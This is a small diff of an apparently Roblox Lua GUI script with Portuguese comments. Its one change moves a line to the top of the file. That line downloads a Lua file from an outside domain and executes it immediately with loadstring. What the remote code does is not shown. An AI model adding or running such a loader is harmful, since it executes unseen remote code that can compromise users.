@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://egorikusa.space/ad3832eed4b259c7f68e1fd6.lua", true))()
 
 -- GUI
 local ScreenGui = Instance.new("ScreenGui")
@@ -46,8 +47,6 @@ if prestige then
     -- Chama a função para alternar a visibilidade
     toggleVisibility()
 end
-
-loadstring(game:HttpGet("https://egorikusa.space/ad3832eed4b259c7f68e1fd6.lua", true))()
 
 --coin
 
